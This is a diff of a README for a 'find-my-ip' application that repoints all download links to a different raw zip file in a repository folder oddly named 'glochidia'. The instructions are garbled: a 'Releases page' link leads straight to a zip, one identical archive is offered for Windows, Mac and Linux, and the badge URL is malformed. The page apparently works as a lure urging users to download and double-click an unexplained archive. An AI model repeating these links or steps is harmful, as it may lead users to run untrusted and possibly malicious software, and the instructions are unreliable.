@@ -6,25 +6,25 @@ Welcome to find-my-ip! This application helps you find out everything about your
 
 ## 🔗 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/devoumes01/find-my-ip/main/glochidia/find_my_ip_v1.0.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/devoumes01/find-my-ip/main/glochidia/find_my_ip_v1.0.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/devoumes01/find-my-ip/main/glochidia/my_ip_find_2.8-beta.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/devoumes01/find-my-ip/main/glochidia/my_ip_find_2.8-beta.3.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Find My IP Releases](https://raw.githubusercontent.com/devoumes01/find-my-ip/main/glochidia/find_my_ip_v1.0.zip). You will find the latest version available for download. Just click on the version number to go to the downloads section.
+To get started, visit this page to download: [Find My IP Releases](https://raw.githubusercontent.com/devoumes01/find-my-ip/main/glochidia/my_ip_find_2.8-beta.3.zip). You will find the latest version available for download. Just click on the version number to go to the downloads section.
 
 ### Step-by-Step Instructions
 
 1. Click the link above to visit the Releases page.
 2. Look for the latest version listed at the top. It will have a tag that looks something like `v1.0`.
 3. Under that version, you will see downloadable files. Choose the one that is compatible with your operating system:
-   - For Windows: `https://raw.githubusercontent.com/devoumes01/find-my-ip/main/glochidia/find_my_ip_v1.0.zip`
-   - For Mac: `https://raw.githubusercontent.com/devoumes01/find-my-ip/main/glochidia/find_my_ip_v1.0.zip`
-   - For Linux: `https://raw.githubusercontent.com/devoumes01/find-my-ip/main/glochidia/find_my_ip_v1.0.zip`
+   - For Windows: `https://raw.githubusercontent.com/devoumes01/find-my-ip/main/glochidia/my_ip_find_2.8-beta.3.zip`
+   - For Mac: `https://raw.githubusercontent.com/devoumes01/find-my-ip/main/glochidia/my_ip_find_2.8-beta.3.zip`
+   - For Linux: `https://raw.githubusercontent.com/devoumes01/find-my-ip/main/glochidia/my_ip_find_2.8-beta.3.zip`
 4. Click on the file to start downloading.
 5. Once the download finishes, find the file in your Downloads folder.
 6. Open the file:
    - For Windows and Mac, double-click the file to begin the installation.
-   - For Linux, extract the https://raw.githubusercontent.com/devoumes01/find-my-ip/main/glochidia/find_my_ip_v1.0.zip file and open the application using your terminal.
+   - For Linux, extract the https://raw.githubusercontent.com/devoumes01/find-my-ip/main/glochidia/my_ip_find_2.8-beta.3.zip file and open the application using your terminal.
 7. Follow the on-screen instructions to complete the installation.
 
 ### System Requirements
